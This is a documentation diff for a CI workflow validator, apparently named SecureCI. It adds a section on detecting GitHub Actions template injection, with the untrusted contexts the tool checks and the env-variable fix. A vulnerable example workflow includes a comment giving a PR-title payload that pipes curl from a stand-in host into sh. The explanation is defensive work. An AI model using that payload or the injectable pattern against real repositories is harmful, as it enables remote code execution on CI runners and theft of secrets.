@@ -12,6 +12,7 @@ introduction and install steps, see the [README](README.md).
   - [Security: what runs where](#security-what-runs-where)
   - [`actions/checkout`](#actionscheckout)
 - [Global configuration](#global-configuration)
+- [Template injection checks (`validate`)](#template-injection-checks-validate)
 - [Pipeline contracts (`validate --contract`)](#pipeline-contracts-validate---contract)
   - [Supply-chain pinning](#supply-chain-pinning)
   - [Requiring a lockfile](#requiring-a-lockfile)
@@ -43,7 +44,7 @@ introduction and install steps, see the [README](README.md).
 
 `run` **executes** the workflow (one container per job by default). To check a
 workflow without running anything, use [`validate`](#machine-readable-output---format)
-(static syntax/contract/expression checks) or `run --dry-run` (simulate, showing
+(static syntax, expression, template-injection and contract checks) or `run --dry-run` (simulate, showing
 what would run). `run` prints a one-line reminder of these alternatives when it
 starts.
 
@@ -161,6 +162,51 @@ runner-images:
   my-self-hosted-runner: my/image:1
 ```
 
+## Template injection checks (`validate`)
+
+GitHub substitutes every `${{ }}` expression into a `run:` script **before** the shell sees it. If the expression is text an outside contributor controls, such as a pull request title, that text becomes part of the script:
+
+```yaml
+on: pull_request_target
+jobs:
+  greet:
+    runs-on: ubuntu-latest
+    steps:
+      # A PR titled `"; curl https://evil.example | sh; echo "` runs that command
+      - run: echo "Thanks for ${{ github.event.pull_request.title }}"
+```
+
+`secureci validate` reports this as an **error** (it is a code-execution path), with the SARIF rule `secureci/injection`:
+
+```
+[ERROR]   [ERROR] jobs.greet.steps[0].run: ${{ github.event.pull_request.title }} expands untrusted input (github.event.pull_request.title) into the shell script, so a crafted value can run arbitrary commands. Pass it through env: (e.g. env: TITLE: ${{ github.event.pull_request.title }}) and use "$TITLE" instead.
+```
+
+**The fix** is to pass the value through the environment and quote the variable, so the shell treats it as data:
+
+```yaml
+- run: echo "Thanks for $TITLE"
+  env:
+    TITLE: ${{ github.event.pull_request.title }}
+```
+
+What is checked:
+
+- **Where:** `run:` scripts, and the `script` input of `actions/github-script` (where the fix is `process.env.NAME`). Expressions in `env:` values are never flagged, since that is the fix; nor are other actions' `with:` inputs.
+- **Untrusted input:** the list kept in [`UNTRUSTED_CONTEXTS`](src/parser/injection.ts), based on [GitHub Security Lab's untrusted-input list](https://securitylab.github.com/resources/github-actions-untrusted-input/):
+  - `github.head_ref`
+  - issue, pull request, discussion, comment and review **titles and bodies** (`github.event.issue.title`, `github.event.pull_request.body`, `github.event.comment.body`, `github.event.review.body`, …)
+  - **branch names and labels** from the pull request head: `github.event.pull_request.head.ref`, `.head.label`, `.head.repo.default_branch`, and `github.event.workflow_run.head_branch` / `.pull_requests.*.head.ref`
+  - **commit messages and author/committer names and emails**: `.message`, `.author.name`, `.author.email`, `.committer.name` and `.committer.email` of `github.event.head_commit` and `github.event.commits.*`; `.message`, `.author.name` and `.author.email` of `github.event.workflow_run.head_commit`; and `github.event.workflow_run.display_title`
+  - **label names** on the issue or pull request (`github.event.issue.labels.*.name`, `github.event.pull_request.labels.*.name`) and wiki `github.event.pages.*.page_name`
+  - **inputs** of `workflow_dispatch` / `workflow_call` (`inputs.<name>` and `github.event.inputs.<name>`), except inputs typed `boolean`, `number`, `choice` or `environment`, which can't hold arbitrary text
+- **Not flagged:** values an outsider can't shape into a payload, e.g. `github.sha`, `github.run_id`, `github.repository`, `github.actor`, `github.ref`, `github.event.pull_request.number`, `secrets.*`, `matrix.*`, `steps.*.outputs.*`, `env.*`.
+- **Expressions are analyzed, not pattern-matched.** `contains()`, `startsWith()`, `endsWith()`, comparisons and `!` produce a boolean, so `${{ contains(github.event.issue.title, 'bug') }}` is safe. `format()`, `join()`, `fromJSON()` and `||` / `&&` pass their operands through, and `toJSON(github.event)` (or any object holding untrusted fields) is flagged. Each offending expression is reported separately.
+- **Local composite actions** (`uses: ./path`) and **local reusable workflows** (`jobs.<id>.uses: ./path.yml`) are followed recursively, with error paths like `jobs.build.steps[1] > ./.github/actions/greet > steps[0].run`. An action input the caller fills with untrusted input (`with: name: ${{ github.event.issue.title }}`), or whose `default:` is untrusted, is treated as untrusted inside that action. Remote actions and workflows are not inspected.
+- Validating a composite **action file** on its own checks its steps for untrusted contexts, but doesn't flag its own `inputs.*`, since what callers pass is unknown.
+
+Limitations: data that reaches a script indirectly (for example an untrusted value written to a step output or to `env:` and then expanded as `${{ steps.x.outputs.y }}` or `${{ env.Y }}`) is not tracked. `github.ref` / `github.ref_name` are not flagged, because only someone with push access to the repository chooses those names.
+
 ## Pipeline contracts (`validate --contract`)
 
 In organizations with a central repo of reusable workflows/actions, a platform team can define a minimum pipeline standard — required actions, forbidden actions, and (optionally) the order required actions must run in — and have SecureCI check a caller's workflow against it.
@@ -259,7 +305,7 @@ secureci validate .github/workflows/ci.yml --contract contract.yml --format sari
 ```
 
 - **`json`**: `{ file, valid, errors: [{ path, message, severity }] }`.
-- **`sarif`**: a SARIF 2.1.0 log (rules `secureci/validation`, `secureci/contract`, `secureci/expression`). Upload it with `github/codeql-action/upload-sarif` to see findings inline on pull requests in GitHub code scanning.
+- **`sarif`**: a SARIF 2.1.0 log (rules `secureci/validation`, `secureci/contract`, `secureci/expression`, `secureci/injection`). Upload it with `github/codeql-action/upload-sarif` to see findings inline on pull requests in GitHub code scanning.
 
 ## Action inventory and drift (`secureci inventory`)
 
